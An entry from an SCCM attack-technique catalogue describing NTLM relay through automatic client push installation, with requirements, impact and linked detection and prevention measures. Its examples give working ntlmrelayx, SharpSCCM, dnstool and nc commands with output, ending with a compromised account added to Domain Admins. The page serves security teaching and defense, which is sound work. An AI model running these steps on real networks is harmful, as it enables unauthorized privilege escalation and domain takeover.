# ELEVATE-2

## Description
NTLM relay via automatic client push installation

## MITRE ATT&CK Tactics
- [TA0008](https://attack.mitre.org/tactics/TA0008) - Lateral Movement
- [TA0004](https://attack.mitre.org/tactics/TA0004) - Privilege Escalation

## Requirements

### Coercion
- Valid Active Directory domain credentials
- Connectivity to HTTPS (TCP/443) on a management point
- Connectivity from the primary site server to SMB (TCP/445) on the relay server
- To coerce HTTP authentication from a site server where the WebClient service is installed, but not started, the ability to add a DNS A record to the Active Directory domain is required [DEFAULT]
- Primary site server settings:
    - Automatic site-wide client push installation is enabled
    - Automatic site assignment is enabled
    - `Allow connection fallback to NTLM` is enabled for client push installation
    - PKI certificates are not required for client authentication
    - `BlockNTLM` = `0` or not present, or = `1` and `BlockNTLMServerExceptionList` contains attacker relay server [DEFAULT]
    - `RestrictSendingNTLMTraffic` = `0`, `1`, or not present, or = `2` and `ClientAllowedNTLMServers` contains attacker relay server [DEFAULT]
    - Domain computer account is not in `Protected Users` [DEFAULT]
- Domain controller settings:
    - `RestrictNTLMInDomain` = `0` or not present, or is configured with any value and `DCAllowedNTLMServers` contains coercion target [DEFAULT]

### Relay
- Relay target settings:
    - Connectivity from the relay server to SMB (TCP/445) on the relay target
    - `RequireSecuritySignature` = `0` or not present [DEFAULT]
    - `RestrictReceivingNTLMTraffic` = `0` or not present [DEFAULT]
    - Coercion target is local admin (to access RPC/admin shares)
- Domain controller settings:
    - `RestrictNTLMInDomain` = `0` or not present, or is configured with any value and `DCAllowedNTLMServers` contains relay target [DEFAULT]
    - `LmCompatibilityLevel` < `5` or not present, or = `5` and LmCompatibilityLevel >= `3` on the coercion target [DEFAULT]

## Summary
When SCCM automatic site assignment and automatic client push installation are enabled, and PKI certificates aren’t required for client authentication, it’s possible to coerce NTLM authentication from the site server's installation and machine accounts to an arbitrary NetBIOS name, FQDN, or IP address, allowing the credentials to be relayed or cracked. This can be done using a low-privileged domain account on any Windows system.

## Impact
Client push installation accounts require local admin privileges to install software on systems in an SCCM site, so it is often possible to relay the credentials and execute actions in the context of a local admin on other SCCM clients in the site. Many organizations use a member of highly privileged groups such as "Domain Admins" for client push installation for the sake of convenience.

If all configured accounts fail when the site server tries to authenticate to a system to install the client, or if no specific installation accounts are configured, the server tries to authenticate with its domain computer account. If SMB is used, [TAKEOVER-1](../../TAKEOVER/TAKEOVER-1/takeover-1_description.md) and [TAKEOVER-2](../../TAKEOVER/TAKEOVER-2/takeover-2_description.md) may be possible. If the WebClient (WebDAV) service is installed on the site server, it is possible to start it remotely and coerce NTLM authentication via HTTP, allowing relay to LDAP or HTTP to conduct attacks such as Shadow Credentials, Resource-based Constrained Delegation, or AD CS ESC8 to take over the server ([TAKEOVER-3](../../TAKEOVER/TAKEOVER-3/takeover-3_description.md) or [TAKEOVER-8](../../TAKEOVER/TAKEOVER-8/takeover-8_description.md)).

## Defensive IDs
- [DETECT-1: Monitor site server domain computer accounts authenticating from another source](../../../defense-techniques/DETECT/DETECT-1/detect-1_description.md)
- [DETECT-3: Monitor client push installation accounts authenticating from anywhere other than the primary site server](../../../defense-techniques/DETECT/DETECT-3/detect-3_description.md)
- [PREVENT-1: Patch site server with KB15599094](../../../defense-techniques/PREVENT/PREVENT-1/prevent-1_description.md)
- [PREVENT-2: Disable Fallback to NTLM](../../../defense-techniques/PREVENT/PREVENT-2/prevent-2_description.md)
- [PREVENT-5: Disable automatic side-wide client push installation](../../../defense-techniques/PREVENT/PREVENT-5/prevent-5_description.md)
- [PREVENT-8: Require PKI certificates for client authentication](../../../defense-techniques/PREVENT/PREVENT-8/prevent-8_description.md)
- [PREVENT-11: Disable and uninstall WebClient on site servers](../../../defense-techniques/PREVENT/PREVENT-11/prevent-11_description.md)
- [PREVENT-12: Require SMB signing on site systems](../../../defense-techniques/PREVENT/PREVENT-12/prevent-12_description.md)

## Subtechniques
- ELEVATE-2.1: Coerce SMB Authentication
- ELEVATE-2.2: Coerce HTTP Authentication

## Examples

It is not possible to identify whether automatic site-wide client push installation, automatic site assignment, and `Allow connection fallback to NTLM` are enabled without attempting this attack.

### ELEVATE-2.1

1. On the attacker relay server, start `ntlmrelayx`, targeting the IP address of the relay target and the SMB service:

    ```
    # impacket-ntlmrelayx -smb2support -ts -ip <NTLMRELAYX_LISTENER_IP> -t <RELAY_TARGET_IP>
    Impacket v0.11.0 - Copyright 2023 Fortra

    [2024-02-26 15:49:48] [*] Protocol Client MSSQL loaded..
    [2024-02-26 15:49:48] [*] Protocol Client LDAPS loaded..
    [2024-02-26 15:49:48] [*] Protocol Client LDAP loaded..
    [2024-02-26 15:49:48] [*] Protocol Client RPC loaded..
    [2024-02-26 15:49:48] [*] Protocol Client HTTPS loaded..
    [2024-02-26 15:49:48] [*] Protocol Client HTTP loaded..
    [2024-02-26 15:49:48] [*] Protocol Client IMAPS loaded..
    [2024-02-26 15:49:48] [*] Protocol Client IMAP loaded..
    [2024-02-26 15:49:48] [*] Protocol Client SMTP loaded..
    [2024-02-26 15:49:48] [*] Protocol Client SMB loaded..
    [2024-02-26 15:49:48] [*] Protocol Client DCSYNC loaded..
    [2024-02-26 15:49:50] [*] Running in relay mode to single host
    [2024-02-26 15:49:50] [*] Setting up SMB Server
    [2024-02-26 15:49:50] [*] Setting up HTTP Server on port 80
    [2024-02-26 15:49:50] [*] Setting up WCF Server
    [2024-02-26 15:49:50] [*] Setting up RAW Server on port 6666

    [2024-02-26 15:49:50] [*] Servers started, waiting for connections
    ```

2. Use SharpSCCM's `invoke client-push` function to register a new device with the management point and send a DDR to initiate automatic client push installation to your relay server running ntlmrelayx:

    ```
    SharpSCCM.exe invoke client-push -sms <MANAGEMENT_POINT> -sc <SITECODE> -t <NTLMRELAYX_LISTENER_IP>

    [+] Created "ConfigMgr Client Messaging" certificate in memory for device registration and signing/encrypting subsequent messages
    [+] Reusable Base64-encoded certificate:

        308209D2...020207D0

    [+] Discovering local properties for client registration request
    [+] Modifying client registration request properties:
        FQDN: <NTLMRELAYX_LISTENER_IP>
        NetBIOS name: <NTLMRELAYX_LISTENER_IP>
        Site code: <SITECODE>
    [+] Sending HTTP registration request to <MANAGEMENT_POINT>:80
    [+] Received unique SMS client GUID for new device:

        GUID:257EC4DF-C376-43A9-BAD1-D4AA25B48A2C

    [+] Discovering local properties for DDR inventory report
    [+] Modifying DDR and inventory report properties
    [+] Discovered PlatformID: Microsoft Windows NT Server 10.0
    [+] Modified PlatformID: Microsoft Windows NT Workstation 2010.0
    [+] Sending DDR from GUID:257EC4DF-C376-43A9-BAD1-D4AA25B48A2C to MP_DdrEndpoint endpoint on <MANAGEMENT_POINT>:<SITECODE> and requesting client installation on <NTLMRELAYX_LISTENER_IP>
    [+] Completed execution in 00:00:16.1952455
    ```
    **Note**: Sometimes, this command results in a client device record being created, but SCCM does not kick off automatic client push installation right away. Running the same command again should kick off the process.

3. After a few minutes, ntlmrelayx should receive a connection from the configured client push installation account(s) and the site server’s machine account:
    ```
    [2024-02-26 16:19:47] [*] SMBD-Thread-5 (process_request_thread): Received connection from <SITE_SERVER>, attacking target smb://<RELAY_TARGET>
    [2024-02-26 16:19:48] [*] Authenticating against smb://<RELAY_TARGET> as MAYYHEM/CLIENTPUSH SUCCEED
    ```
    
### ELEVATE-2.2

1. On the attacker relay server, start `ntlmrelayx`, targeting the IP address of the domain controller relay target and the LDAP(S) service:

    ```
    # ntlmrelayx.py -t ldaps://<DOMAIN_CONTROLLER_IP> -smb2support -ts --no-smb-server -i    
    Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
    
    [2026-02-06 18:11:47] [*] Protocol Client SMB loaded..
    [2026-02-06 18:11:47] [*] Protocol Client SMTP loaded..
    [2026-02-06 18:11:47] [*] Protocol Client HTTPS loaded..
    [2026-02-06 18:11:47] [*] Protocol Client HTTP loaded..
    [2026-02-06 18:11:47] [*] Protocol Client WINRMS loaded..
    [2026-02-06 18:11:47] [*] Protocol Client IMAP loaded..
    [2026-02-06 18:11:47] [*] Protocol Client IMAPS loaded..
    [2026-02-06 18:11:47] [*] Protocol Client DCSYNC loaded..
    [2026-02-06 18:11:47] [*] Protocol Client RPC loaded..
    [2026-02-06 18:11:47] [*] Protocol Client MSSQL loaded..
    [2026-02-06 18:11:47] [*] Protocol Client LDAPS loaded..
    [2026-02-06 18:11:47] [*] Protocol Client LDAP loaded..
    [2026-02-06 18:11:47] [*] Running in relay mode to single host
    [2026-02-06 18:11:47] [*] Setting up HTTP Server on port 80
    [2026-02-06 18:11:47] [*] Setting up WCF Server on port 9389
    [2026-02-06 18:11:47] [*] Setting up RAW Server on port 6666
    [2026-02-06 18:11:47] [*] Setting up WinRM (HTTP) Server on port 5985
    [2026-02-06 18:11:47] [*] Setting up WinRMS (HTTPS) Server on port 5986
    [2026-02-06 18:11:47] [*] Setting up RPC Server on port 135
    [2026-02-06 18:11:47] [*] Multirelay disabled
    
    [2026-02-06 18:11:47] [*] Servers started, waiting for connections

    ```

2. Use a low-privilege Active Directory account to add a DNS A record to the domain, pointing the record to the `ntlmrelayx` listener IP.

    ```
    python3 dnstool.py -u LUDUS.DOMAIN\\domainuser -p 'password' -r RELAY-SERVER -a add -d <NTLMRELAYX_LISTENER_IP> <DOMAIN_CONTROLLER_IP>
    [-] Connecting to host...
    [-] Binding to host
    [+] Bind OK
    [-] Adding new record
    [+] LDAP operation completed successfully
    ```

3. Use SharpSCCM's `invoke client-push` function to register a new device with the management point and send a DDR to initiate automatic client push installation to your relay server running ntlmrelayx:

    ```
    SharpSCCM.exe invoke client-push -sms <MANAGEMENT_POINT> -sc <SITECODE> -t RELAY-SERVER

    [+] Created "ConfigMgr Client Messaging" certificate in memory for device registration and signing/encrypting subsequent messages
    [+] Reusable Base64-encoded certificate:

        308209D2...020207D0

    [+] Discovering local properties for client registration request
    [+] Modifying client registration request properties:
        FQDN: <NTLMRELAYX_LISTENER_IP>
        NetBIOS name: <NTLMRELAYX_LISTENER_IP>
        Site code: <SITECODE>
    [+] Sending HTTP registration request to <MANAGEMENT_POINT>:80
    [+] Received unique SMS client GUID for new device:

        GUID:257EC4DF-C376-43A9-BAD1-D4AA25B48A2C

    [+] Discovering local properties for DDR inventory report
    [+] Modifying DDR and inventory report properties
    [+] Discovered PlatformID: Microsoft Windows NT Server 10.0
    [+] Modified PlatformID: Microsoft Windows NT Workstation 2010.0
    [+] Sending DDR from GUID:257EC4DF-C376-43A9-BAD1-D4AA25B48A2C to MP_DdrEndpoint endpoint on <MANAGEMENT_POINT>:<SITECODE> and requesting client installation on <NTLMRELAYX_LISTENER_IP>
    [+] Completed execution in 00:00:16.1952455
    ```
    **Note**: Sometimes, this command results in a client device record being created, but SCCM does not kick off automatic client push installation right away. Running the same command again should kick off the process.

4. After a few minutes, ntlmrelayx should receive a connection from the configured client push installation account(s) and relay that connection to the LDAP target:
    ```
    [2026-02-06 18:11:47] [*] Servers started, waiting for connections
    [2026-02-06 18:13:01] [*] (HTTP): Client requested path: /admin%24
    [2026-02-06 18:13:01] [*] (HTTP): Client requested path: /admin%24
    [2026-02-06 18:13:01] [*] (HTTP): Connection from 10.2.10.15 controlled, attacking target ldaps://10.2.10.10
    [2026-02-06 18:13:01] [*] (HTTP): Client requested path: /admin%24
    [2026-02-06 18:13:01] [*] (HTTP): Authenticating connection from LUDUS/SCCM_PUSH@10.2.10.15 against ldaps://10.2.10.10 SUCCEED [1]
    [2026-02-06 18:13:01] [*] ldaps://LUDUS/SCCM_PUSH@10.2.10.10 [1] -> Started interactive Ldap shell via TCP on 127.0.0.1:11000 as LUDUS/SCCM_PUSH
    ```
5. Using a secondary session on the relay server, connect to the interactive LDAP shell started by `ntlmrelayx` and perform privilege escalation activities as the compromised identity. For example, adding an attacker controller low-privilege user to a tier zero group.

    ```
    # nc -nv 127.0.0.1 11000
    (UNKNOWN) [127.0.0.1] 11000 (?) open
    Type help for list of commands

    # whoami
    u:ludus\sccm_push

    # add_user_to_group domainuser "Domain Admins"
    Adding user: domainuser to group Domain Admins result: OK
    
    ```

### Cleanup
It is not possible to remotely delete device records or remove CCRs in the retry queue that are created by heartbeat DDRs without having `Full Administrator` privileges to SCCM. By default, the site will retry client push installation every 60 minutes for 7 days, and if a newly discovered device sits in the client push installation retry queue for more than 24 hours, an error message may be displayed in the console to administrators.

With `Full Administrator` access to SCCM, artifacts created by SharpSCCM that cause client push installation retries can be removed from the site server and database through the ConfigMgr console or using SharpSCCM.

The following command can be used to identify the device's ResourceId:

```
SharpSCCM.exe get devices -sms <SMS_PROVIDER> -sc <SITECODE> -n <NTLMRELAYX_LISTENER_IP> -p "Name" -p "ResourceId" -p "SMSUniqueIdentifier"

[+] Connecting to \\<SMS_PROVIDER>\root\SMS\site_<SITECODE>
[+] Executing WQL query: SELECT ResourceId,Name,SMSUniqueIdentifier FROM SMS_R_System WHERE Name LIKE '%<NTLMRELAYX_LISTENER_IP>%'
-----------------------------------
SMS_R_System
-----------------------------------
Name: <NTLMRELAYX_LISTENER_IP>
ResourceId: 16777236
SMSUniqueIdentifier: GUID:593FA39D-B6C6-4B8F-A4DE-2454503116FC
-----------------------------------
Name: <NTLMRELAYX_LISTENER_IP>
ResourceId: 16777237
SMSUniqueIdentifier: GUID:257EC4DF-C376-43A9-BAD1-D4AA25B48A2C
-----------------------------------
```

The following command can be used to remove a device with a specified GUID:

```
SharpSCCM.exe remove device GUID:<GUID> -sms <SMS_PROVIDER> -sc <SITECODE>

[+] Connecting to \\<SMS_PROVIDER>\root\SMS\site_<SITECODE>
[+] Deleted device with SMSUniqueIdentifier GUID:257EC4DF-C376-43A9-BAD1-D4AA25B48A2C
[+] Completed execution in 00:00:01.8554465
```

## References
- Chris Thompson, [Coercing NTLM Authentication from SCCM Servers](https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a)
- Chris Thompson, [SharpSCCM](https://github.com/Mayyhem/SharpSCCM)
- Logan Goins, [Wait, Why is my WebClient Started?: SCCM Hierarchy Takeover via NTLM Relay to LDAP](https://specterops.io/blog/2026/01/14/wait-why-is-my-webclient-started-sccm-hierarchy-takeover-via-ntlm-relay-to-ldap/)
